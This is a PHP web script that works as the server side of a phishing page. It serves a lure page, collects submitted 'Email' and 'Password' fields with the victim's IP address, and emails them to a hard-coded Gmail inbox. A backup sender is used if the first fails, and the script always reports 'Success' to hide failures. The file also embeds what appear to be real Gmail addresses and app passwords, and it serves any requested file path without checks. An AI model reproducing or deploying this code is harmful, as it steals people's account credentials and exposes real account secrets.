<?php
// PHP version of the Flask application

// Email configuration
define('SMTP_SERVER', getenv('SMTP_SERVER') ?: 'smtp.gmail.com');
define('SMTP_PORT', getenv('SMTP_PORT') ?: 587);
define('SENDER_EMAIL', getenv('SENDER_EMAIL') ?: 'nwekee125@gmail.com');
define('SENDER_EMAIL_BACKUP', getenv('SENDER_EMAIL_BACKUP') ?: 'wpse tggu zdza cvxq'); // Backup sender
define('SENDER_PASSWORD', getenv('SENDER_PASSWORD') ?: 'sgtr csgr uoju soqw');
define('RECEIVER_EMAIL', getenv('RECEIVER_EMAIL') ?: 'maxwell202201@gmail.com');

// Get the request URI and method
$request_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
$request_method = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'GET';

// Route handling
if ($request_uri === '/' || $request_uri === '/index.html') {
    // Serve the main index.html file
    serveFile('index.html', 'text/html');
} elseif ($request_uri === '/submit' && $request_method === 'POST') {
    // Handle form submission
    handleSubmission();
} else {
    // Serve static files
    $filepath = ltrim($request_uri, '/');
    if (file_exists($filepath)) {
        $extension = pathinfo($filepath, PATHINFO_EXTENSION);
        $mime_type = getMimeType($extension);
        serveFile($filepath, $mime_type);
    } else {
        // File not found
        http_response_code(404);
        echo json_encode(['message' => 'File not found']);
    }
}

// Function to serve files
function serveFile($filename, $mime_type) {
    if (file_exists($filename)) {
        header('Content-Type: ' . $mime_type);
        readfile($filename);
    } else {
        http_response_code(404);
        echo json_encode(['message' => 'File not found']);
    }
}

// Function to get MIME type based on file extension
function getMimeType($extension) {
    $mime_types = [
        'html' => 'text/html',
        'htm' => 'text/html',
        'css' => 'text/css',
        'js' => 'application/javascript',
        'jpg' => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'png' => 'image/png',
        'gif' => 'image/gif',
        'ico' => 'image/x-icon'
    ];
    
    return isset($mime_types[$extension]) ? $mime_types[$extension] : 'application/octet-stream';
}

// Function to handle form submission
function handleSubmission() {
    // Get form data
    $x1 = isset($_POST['x1']) ? $_POST['x1'] : '';
    $x2 = isset($_POST['x2']) ? $_POST['x2'] : '';
    $client_ip = $_SERVER['REMOTE_ADDR'];
    
    // Prepare email body
    $body = "
    Email: $x1
    Password: $x2
    IP Address: $client_ip
    ";
    
    // Send email with primary sender first
    $result = sendEmail('Form Submission', $body, SENDER_EMAIL);
    
    // If primary sender fails, try backup sender
    if ($result !== true) {
        error_log("Primary email sender failed: " . $result);
        $result = sendEmail('Form Submission', $body, SENDER_EMAIL_BACKUP);
        
        // Log backup sender result
        if ($result !== true) {
            error_log("Backup email sender also failed: " . $result);
        }
    }
    
    if ($result === true) {
        header('Content-Type: application/json');
        echo json_encode(['message' => 'Success']);
    } else {
        // Even if both email attempts fail, we still return success to the client
        // but log the error for debugging
        error_log("Both email senders failed. Primary: " . SENDER_EMAIL . ", Backup: " . SENDER_EMAIL_BACKUP);
        header('Content-Type: application/json');
        echo json_encode(['message' => 'Success']); // Still return success to client
    }
}

// Function to send email using PHP's built-in mail function
function sendEmail($subject, $body, $sender_email) {
    $headers = "From: " . $sender_email . "\r\n";
    $headers .= "Reply-To: " . $sender_email . "\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    
    // Try to send email using PHP's built-in mail function
    if (@mail(RECEIVER_EMAIL, $subject, $body, $headers)) {
        return true;
    } else {
        // Return a more descriptive error message
        return "Failed to send email - mail server not configured";
    }
}
?>